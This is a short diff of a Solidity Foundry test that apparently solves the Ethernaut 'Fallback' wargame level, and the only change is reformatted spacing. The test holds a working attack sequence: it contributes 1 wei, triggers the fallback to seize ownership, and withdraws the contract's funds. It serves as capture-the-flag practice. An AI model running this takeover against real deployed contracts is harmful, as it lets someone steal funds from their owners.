@@ -23,8 +23,8 @@ contract FallbackTest is Test {
         Fallback fallbackSC = Fallback(payable(levelAddress));
 
         // attack
-        fallbackSC.contribute{value: 1 wei}();
-        address(payable(fallbackSC)).call{value: 1 wei}(new bytes(0));
+        fallbackSC.contribute{ value: 1 wei }();
+        address(payable(fallbackSC)).call{ value: 1 wei }(new bytes(0));
         assertEq(fallbackSC.owner(), me);
 
         fallbackSC.withdraw();
